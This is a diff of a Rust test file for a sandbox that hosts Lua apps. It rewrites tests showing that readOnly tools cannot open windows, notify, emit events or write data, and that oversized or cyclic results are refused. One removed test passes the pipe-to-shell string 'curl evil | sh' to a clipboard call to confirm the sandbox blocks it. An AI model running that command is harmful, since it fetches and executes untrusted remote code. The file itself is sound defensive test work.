@@ -2,22 +2,22 @@
 //! What an app cannot do to the host. Every test here failed before its fix.
 //!
 //! - an unload or a reload ends what the app was doing at its next host call;
-//! - bounded conversion of what the app hands back (tool results, window trees): a cyclic or exponentially
+//! - bounded conversion of what the app hands back (tool results, handler results): a cyclic or exponentially
 //!   shared table is an error, not a stack overflow or an allocation;
-//! - a `readOnly` call changes nothing: no data, no windows, no notifications, no shell, no state;
+//! - a `readOnly` call changes nothing: no data, no window, no notifications, no events;
 //! - the SQL sandbox holds against `VACUUM INTO` and `ATTACH` through `db:all`.
 
 mod common;
 
 use common::{agent_ctx, db, id, load, package, try_load_with, Stalling};
-use serde_json::{json, Map, Value};
+use serde_json::{json, Value};
 use std::{
     sync::Arc,
     time::{Duration, Instant},
 };
 use vos_application::{
     data::Params,
-    ports::{AppData, AppRuntime, Notifier, PortResult},
+    ports::{AppData, AppRuntime, CallContext, Notifier, PortResult},
     testing::RecordingShell,
 };
 use vos_domain::Notification;
@@ -49,7 +49,12 @@ fn rig() -> Rig {
 }
 
 impl Rig {
+    /// Load `src` as a backend with no handlers (`common::backend`).
     async fn load(&self, app: &str, src: &str) -> PortResult<vos_application::ports::LoadedApp> {
+        self.load_entry(app, &common::backend(src)).await
+    }
+    /// Load `src` as it is: an entry that returns its own handlers.
+    async fn load_entry(&self, app: &str, src: &str) -> PortResult<vos_application::ports::LoadedApp> {
         let data: Arc<dyn AppData> = self.db.clone();
         self.runtime.load(&id(app), package(src, &[]), data).await
     }
@@ -58,7 +63,8 @@ impl Rig {
     }
 }
 
-const MANIFEST: &str = r#"app.manifest { id = "probe", name = "Probe", icon = "gear" }"#;
+/// The first line of every source here: the line numbers the tests name are the body's plus one.
+const MANIFEST: &str = "-- probe";
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn unloading_stops_a_runaway_call_and_the_vm_is_freed() {
@@ -89,7 +95,7 @@ async fn unloading_stops_a_runaway_call_and_the_vm_is_freed() {
     assert!(rig.tool("probe", "spin").await.is_err(), "and the app is gone");
 }
 
-// ---- blocker 3: bounded output, bounded effects, declared windows only ---------------------------------------
+// ---- blocker 3: bounded output, bounded effects, the one window only ------------------------------------------
 
 #[tokio::test]
 async fn a_tool_result_that_expands_to_gigabytes_is_an_error_not_an_allocation() {
@@ -125,203 +131,101 @@ async fn a_tool_result_that_expands_to_gigabytes_is_an_error_not_an_allocation()
     }
 }
 
-fn window_app(render: &str) -> String {
-    format!("{MANIFEST}\napp.window(\"main\", {{ render = function(w)\n{render}\nend }})")
-}
-
-async fn render_error(render: &str) -> String {
-    let rig = rig();
-    rig.load("probe", &window_app(render)).await.unwrap();
-    let started = std::time::Instant::now();
-    let err = rig
-        .runtime
-        .open_view(&id("probe"), "v1", "main", Map::new(), Map::new())
-        .await
-        .expect_err("the tree must be refused");
-    assert!(started.elapsed() < PROMPTLY, "refusing took {:?}", started.elapsed());
-    err.to_string()
-}
-
+/// What a handler hands back to the app's page is converted under the same bounds as a tool's result.
 #[tokio::test]
-async fn a_view_tree_that_contains_itself_is_refused_not_a_stack_overflow() {
-    let err = render_error(r#"local n = { type = "Stack", key = "n" } n.children = { n } return n"#).await;
-    assert!(err.contains("contains itself"), "{err}");
-}
-
-#[tokio::test]
-async fn a_view_tree_nested_past_the_limit_is_refused_while_it_is_converted() {
-    let err = render_error(
-        r#"local n = { type = "Stack", key = "leaf" }
-           for i = 1, 5000 do n = { type = "Stack", key = "k" .. i, children = { n } } end
-           return n"#,
-    )
-    .await;
-    assert!(err.contains("at most 64 levels deep"), "{err}");
-}
-
-#[tokio::test]
-async fn a_view_tree_shared_at_every_level_is_cut_off_at_the_node_limit() {
-    let err = render_error(
-        r#"local n = { type = "Stack", key = "leaf" }
-           for i = 1, 25 do n = { type = "Stack", key = "k" .. i, children = { n, n } } end
-           return n"#,
-    )
-    .await;
-    assert!(err.contains("at most 10000 nodes"), "{err}");
-}
-
-#[tokio::test]
-async fn props_shared_at_every_level_are_cut_off_by_the_trees_budget() {
-    let err = render_error(
-        r#"local t = { 1 }
-           for i = 1, 30 do t = { t, t } end
-           return { type = "Stack", key = "n", props = { data = t } }"#,
-    )
-    .await;
-    assert!(err.contains("more than"), "{err}");
-}
-
-#[tokio::test]
-async fn open_window_accepts_only_windows_the_app_declared() {
+async fn a_handler_result_that_contains_itself_or_expands_to_gigabytes_is_an_error_not_an_allocation() {
     let rig = rig();
     let src = format!(
         r#"{MANIFEST}
-        app.window("main", {{ render = function(w) return {{ type = "Stack", key = "n" }} end }})
-        local function try(f) local ok, err = pcall(f); return {{ ok = ok, err = (not ok) and tostring(err) or nil }} end
-        app.tool {{ name = "declared", run = function() app:openWindow("main", {{ a = 1 }}) return true end }}
-        app.tool {{ name = "undeclared", run = function() return try(function() app:openWindow("evil", {{}}) end) end }}"#
+        return {{
+          cycle = function() local n = {{ type = "Stack", key = "n" }} n.children = {{ n }} return n end,
+          dag = function()
+            local t = {{ 1 }}
+            for i = 1, 25 do t = {{ t, t }} end
+            return {{ type = "Stack", key = "n", props = {{ data = t }} }}
+          end,
+          deep = function()
+            local n = {{ key = "leaf" }}
+            for i = 1, 5000 do n = {{ key = "k" .. i, children = {{ n }} }} end
+            return n
+          end,
+        }}"#
     );
-    rig.load("probe", &src).await.unwrap();
-    rig.tool("probe", "declared").await.unwrap();
-    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1);
-    let out = rig.tool("probe", "undeclared").await.unwrap();
-    assert_eq!(out["ok"], false);
-    let why = out["err"].as_str().unwrap();
-    assert!(why.contains("no window `evil` is declared") && why.contains("declared: main"), "{why}");
-    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1, "nothing was asked of the shell");
-}
-
-// ---- AGOS-60: `app:windows` ----------------------------------------------------------------------------------
-
-const WINDOWS_APP: &str = r#"
-    app.window("main", { render = function(w) return { type = "Stack", key = "n" } end })
-    local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
-    app.tool { name = "ids", readOnly = true, run = function()
-      local ids = {}
-      for _, w in ipairs(app:windows("main")) do ids[#ids + 1] = w.id end
-      return ids
-    end }
-    app.tool { name = "announce", readOnly = true, run = function()
-      return try(function() for _, w in ipairs(app:windows("main")) do w:announce("x") end end) end }
-    app.tool { name = "undeclared", readOnly = true, run = function()
-      return try(function() app:windows("evil") end) end }
-"#;
-
-async fn open_views(rig: &Rig, views: &[&str]) {
-    for view in views {
-        rig.runtime.open_view(&id("probe"), view, "main", Map::new(), Map::new()).await.unwrap();
+    rig.load_entry("probe", &src).await.unwrap();
+    let user = CallContext { actor: vos_domain::Actor::user("You"), now_ms: 0 };
+    for (handler, why) in
+        [("cycle", "contains itself"), ("dag", "more than 100000 values"), ("deep", "nested too deeply")]
+    {
+        let started = std::time::Instant::now();
+        let err = rig
+            .runtime
+            .call_handler(&id("probe"), handler, json!(null), user.clone())
+            .await
+            .expect_err("the result must be refused")
+            .to_string();
+        assert!(err.contains(why), "{handler}: {err}");
+        assert!(started.elapsed() < PROMPTLY, "{handler} took {:?}", started.elapsed());
     }
 }
 
 #[tokio::test]
-async fn a_read_only_tool_may_list_the_open_windows_but_not_change_them() {
+async fn open_window_asks_for_the_apps_one_window_and_refuses_any_other_name() {
     let rig = rig();
-    rig.load("probe", &format!("{MANIFEST}\n{WINDOWS_APP}")).await.unwrap();
-    open_views(&rig, &["v1", "v2"]).await;
-
-    assert_eq!(rig.tool("probe", "ids").await.unwrap(), json!(["v1", "v2"]), "listing is a read");
-    let out = rig.tool("probe", "announce").await.unwrap();
-    assert_eq!(out["ok"], false, "{out}");
-    assert!(out["err"].as_str().unwrap().contains("readOnly"), "{out}");
-    let effects = rig.runtime.take_view_effects(&id("probe")).await.unwrap();
-    assert!(effects.is_empty(), "the refused call left nothing for the windows: {effects:?}");
-}
-
-#[tokio::test]
-async fn app_windows_with_an_undeclared_name_is_an_error_that_names_app_windows() {
-    let rig = rig();
-    rig.load("probe", &format!("{MANIFEST}\n{WINDOWS_APP}")).await.unwrap();
-    let out = rig.tool("probe", "undeclared").await.unwrap();
-    assert_eq!(out["ok"], false, "{out}");
+    let src = format!(
+        r#"{MANIFEST}
+        local function try(f) local ok, err = pcall(f); return {{ ok = ok, err = (not ok) and tostring(err) or nil }} end
+        app.tool {{ name = "main", run = function() app:openWindow("main", {{ a = 1 }}) return true end }}
+        app.tool {{ name = "other", run = function() return try(function() app:openWindow("evil", {{}}) end) end }}"#
+    );
+    rig.load("probe", &src).await.unwrap();
+    rig.tool("probe", "main").await.unwrap();
+    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1);
+    let out = rig.tool("probe", "other").await.unwrap();
+    assert_eq!(out["ok"], false);
     let why = out["err"].as_str().unwrap();
-    assert!(why.contains("app:windows: no window `evil` is declared"), "{why}");
-    assert!(why.contains("declared: main"), "{why}");
-    assert!(!why.contains("openWindow"), "the error names the call that was made: {why}");
-}
-
-#[tokio::test]
-async fn app_windows_lists_the_open_windows_in_the_order_they_were_opened() {
-    let rig = rig();
-    rig.load("probe", &format!("{MANIFEST}\n{WINDOWS_APP}")).await.unwrap();
-    // as text, `v10` sorts before `v2`
-    open_views(&rig, &["v1", "v2", "v9", "v10", "v11"]).await;
-    assert_eq!(rig.tool("probe", "ids").await.unwrap(), json!(["v1", "v2", "v9", "v10", "v11"]));
+    assert!(why.contains("an app has one window, `main`") && why.contains("got `evil`"), "{why}");
+    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1, "nothing was asked of the shell");
 }
 
 // ---- blocker 4 and major 15: a readOnly call changes nothing -------------------------------------------------
 
 const READ_ONLY_APP: &str = r#"
-    app.window("main", {
-      onOpen = function(w) app.db:exec("insert into log(msg) values ('opened')") end,
-      render = function(w) return { type = "Stack", key = "n" } end,
-    })
     app.db:migrate { [1] = "create table log(id integer primary key, msg text)" }
-    local state = app.state { n = 0 }
+    local n = 0
     local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
     app.tool { name = "open", readOnly = true, run = function() return try(function() app:openWindow("main") end) end }
     app.tool { name = "notify", readOnly = true, run = function() return try(function() app.notify { title = "hi" } end) end }
-    app.tool { name = "link", readOnly = true, run = function()
-      return try(function() app.shell.deepLink("a/:id", function() end) end) end }
-    app.tool { name = "state", readOnly = true, run = function() return try(function() state.n = 1 end) end }
+    app.tool { name = "emit", readOnly = true, run = function() return try(function() app.emit("changed") end) end }
     -- not declared readOnly: allowed to do all of it (but the caller may still require a read-only run)
     app.tool { name = "everything", run = function()
-      state.n = state.n + 1
       app:openWindow("main")
       app.notify { title = "hi" }
-      app.shell.deepLink("b/:id", function() end)
-      return state.n
+      app.emit("changed")
+      app.db:exec("insert into log(msg) values ('did everything')")
+      n = n + 1
+      return n
     end }
     app.tool { name = "count", readOnly = true, run = function() return app.db:one("select count(*) as n from log").n end }
 "#;
 
 #[tokio::test]
-async fn a_read_only_tool_cannot_open_a_window_notify_change_the_shell_or_assign_state() {
+async fn a_read_only_tool_cannot_open_the_window_notify_or_emit() {
     let rig = rig();
     rig.load("probe", &format!("{MANIFEST}\n{READ_ONLY_APP}")).await.unwrap();
-    for tool in ["open", "notify", "link", "state"] {
+    for tool in ["open", "notify", "emit"] {
         let out = rig.tool("probe", tool).await.unwrap();
         assert_eq!(out["ok"], false, "{tool} must be refused: {out}");
         assert!(out["err"].as_str().unwrap().contains("readOnly"), "{tool}: {out}");
     }
-    assert!(rig.shell.windows.lock().unwrap().is_empty(), "no window was opened, so no onOpen could write");
-    assert!(rig.shell.links.lock().unwrap().is_empty());
+    assert!(rig.shell.windows.lock().unwrap().is_empty(), "the shell was not asked for the window");
+    assert!(rig.shell.events.lock().unwrap().is_empty(), "no event reached the app's pages");
     assert_eq!(rig.tool("probe", "count").await.unwrap(), json!(0), "the table is unchanged");
 
-    // and a tool that is not readOnly still can (state was untouched by the refused write above)
+    // and a tool that is not readOnly still can
     assert_eq!(rig.tool("probe", "everything").await.unwrap(), json!(1));
     assert_eq!(rig.shell.windows.lock().unwrap().len(), 1);
-}
-
-/// `app.state` compares the old and the new value; an `__eq` that reads `app.state` must not deadlock on the
-/// tracker's lock (which would hang a worker thread of the host).
-#[tokio::test]
-async fn an_eq_metamethod_may_read_app_state_while_a_field_is_assigned() {
-    let rig = rig();
-    let app = format!(
-        "{MANIFEST}\n{}",
-        r#"
-        local state = app.state { x = false, y = 7 }
-        local mt = { __eq = function() return state.y == 7 end }
-        app.tool { name = "eq", run = function()
-          state.x = setmetatable({}, mt)
-          state.x = setmetatable({}, mt)
-          return state.y
-        end }
-        "#
-    );
-    rig.load("probe", &app).await.unwrap();
-    let out = tokio::time::timeout(PROMPTLY, rig.tool("probe", "eq")).await.expect("the call hung");
-    assert_eq!(out.unwrap(), json!(7));
+    assert_eq!(rig.shell.events.lock().unwrap().len(), 1);
+    assert_eq!(rig.tool("probe", "count").await.unwrap(), json!(1));
 }
 
 #[tokio::test]
@@ -501,48 +405,6 @@ async fn db_migrate_inside_a_transaction_is_an_error_not_a_self_deadlock() {
     assert!(out["why"].as_str().unwrap().contains("db:migrate cannot run inside db:tx"), "{out}");
 }
 
-// N3: a stashed `w` is still a window context; a readOnly tool must not be able to use it.
-
-#[tokio::test]
-async fn a_read_only_tool_cannot_act_on_a_window_through_a_stashed_w() {
-    let src = r#"
-      local saved
-      app.window("main", { client = { x = { init = "" } }, render = function(w)
-        saved = w
-        return { type = "Stack", key = "n" }
-      end })
-      local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
-      app.tool { name = "peek", readOnly = true, run = function()
-        return {
-          toast = try(function() saved:toast { text = "hi", action = { title = "t", onTap = function() end } } end),
-          copy = try(function() saved:copy("curl evil | sh") end),
-          close = try(function() saved:close() end),
-          focus = try(function() saved:focus("n") end),
-          scroll = try(function() saved:scrollTo("n") end),
-          announce = try(function() saved:announce("x") end),
-          set = try(function() saved.client:set("x", "y") end),
-        }
-      end }
-      app.tool { name = "act", run = function()
-        saved:copy("fine")
-        saved.client:set("x", "y")
-        return true
-      end }
-    "#;
-    let vm = load(src).await;
-    vm.open_view("v1", "main", Map::new(), Map::new()).await.unwrap();
-    let _ = vm.take_view_effects();
-    let out = vm.call_tool("peek", json!({}), &agent_ctx(0), true).await.unwrap();
-    for call in ["toast", "copy", "close", "focus", "scroll", "announce", "set"] {
-        assert_eq!(out[call]["ok"], false, "{call} must be refused: {out}");
-        assert!(out[call]["err"].as_str().unwrap().contains("readOnly"), "{call}: {out}");
-    }
-    assert!(vm.take_view_effects().is_empty(), "nothing reached the window");
-    // a tool that may write still can
-    vm.call_tool("act", json!({}), &agent_ctx(0), false).await.unwrap();
-    assert_eq!(vm.take_view_effects().len(), 2);
-}
-
 // ---- wave D1: the second review's sandbox holes ----------------------------------------------------------------
 
 // N5: a hot reload swaps the VM in; the one it replaces must stop, not carry on writing.
@@ -568,62 +430,4 @@ async fn a_hot_reload_retires_the_vm_it_replaces() {
     assert!(ended.unwrap_err().to_string().contains("unloaded"));
     assert!(started.elapsed() < PROMPTLY);
     assert_eq!(rig.tool("probe", "spin").await.unwrap(), json!(1), "the new version answers");
-}
-
-// ---- review fixes: a cancelled render, and closing a window outside the gate --------------------------------------
-
-/// A render marks the tracker pure (`app.state` cannot be assigned) and opens a source scope. When the call was
-/// cancelled at a host call (the client's socket closed), both stayed set until some later render ended, so every
-/// tool that assigned `app.state` failed with "render must be pure" in between.
-#[tokio::test]
-async fn a_render_cancelled_at_a_host_call_leaves_app_state_assignable() {
-    let rig = rig();
-    let src = format!(
-        r#"{MANIFEST}
-        local state = app.state {{ n = 0 }}
-        app.window("main", {{ render = function(w)
-          local rows = app.db:all("select 1 as one")
-          return {{ type = "Text", key = "t", props = {{ text = tostring(#rows + state.n) }} }}
-        end }})
-        app.tool {{ name = "bump", run = function()
-          state.n = state.n + 1
-          return state.n
-        end }}"#
-    );
-    rig.load("probe", &src).await.unwrap();
-    // poll the open once (it parks at the database call), then drop it: the cancelled call
-    let app = id("probe");
-    let open = rig.runtime.open_view(&app, "v1", "main", Map::new(), Map::new());
-    tokio::select! {
-        biased;
-        _ = open => panic!("the open finished without waiting at the host call"),
-        () = std::future::ready(()) => {}
-    }
-    let bumped = tokio::time::timeout(PROMPTLY, rig.tool("probe", "bump"))
-        .await
-        .expect("the tool call hung")
-        .expect("assigning app.state after a cancelled render must work");
-    assert_eq!(bumped, json!(1));
-}
-
-/// `onClose` was looked up with `spec:get`, which runs an app's `__index` outside the VM's gate (another call
-/// may be running in the VM at the same time). It is read raw now: an `onClose` that only an `__index` supplies
-/// is not run, and the `__index` is not either.
-#[tokio::test]
-async fn closing_a_window_does_not_run_app_code_outside_the_gate() {
-    let rig = rig();
-    let src = format!(
-        r#"{MANIFEST}
-        local lookups = 0
-        local spec = {{ render = function(w) return {{ type = "Text", key = "t", props = {{ text = "x" }} }} end }}
-        setmetatable(spec, {{ __index = function(_, key) lookups = lookups + 1 end }})
-        app.window("main", spec)
-        app.tool {{ name = "lookups", readOnly = true, run = function() return lookups end }}"#
-    );
-    rig.load("probe", &src).await.unwrap();
-    rig.runtime.open_view(&id("probe"), "v1", "main", Map::new(), Map::new()).await.unwrap();
-    let before = rig.tool("probe", "lookups").await.unwrap().as_u64().unwrap();
-    rig.runtime.close_view(&id("probe"), "v1").await.unwrap();
-    let after = rig.tool("probe", "lookups").await.unwrap().as_u64().unwrap();
-    assert_eq!(before, after, "closing the window ran the spec's __index");
 }
